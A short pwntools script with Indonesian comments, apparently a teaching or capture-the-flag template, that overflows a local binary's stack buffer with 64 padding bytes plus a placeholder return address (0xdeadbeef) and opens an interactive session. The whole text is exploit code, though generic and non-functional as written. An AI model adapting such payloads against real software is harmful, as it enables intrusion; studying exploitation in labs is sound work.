from pwn import *

# Konfigurasi
elf = ELF('./vulnerable_binary')
p = process('./vulnerable_binary')

# Buat payload
offset = 64
ret = 0xdeadbeef  # contoh address
payload = b"A" * offset + p64(ret)

p.sendline(payload)
p.interactive()
